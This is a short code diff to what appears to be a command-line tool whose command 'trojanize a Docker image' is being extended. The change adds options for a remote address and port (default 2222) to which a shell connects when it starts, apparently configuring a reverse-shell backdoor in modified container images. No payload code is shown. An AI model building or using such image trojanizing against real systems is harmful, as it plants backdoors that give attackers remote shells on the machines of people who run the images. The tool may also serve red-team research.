@@ -15,6 +15,16 @@ def modify(ctx, **kwargs):
 @modify.command(help="trojanize a Docker image")
 @click.pass_context
 @click.argument("image_path")
+@click.option("--listen",
+              "-l",
+              "remote_addr",
+              required=True,
+              help="remote address where to connect to on shell starts")
+@click.option("-p",
+              "--port",
+              "remote_port",
+              default="2222",
+              help="Remote port where to connect to on shell starts")
 @click.option("--output", "-o", "output_image")
 @click.option("--image-repository",
               "-r",
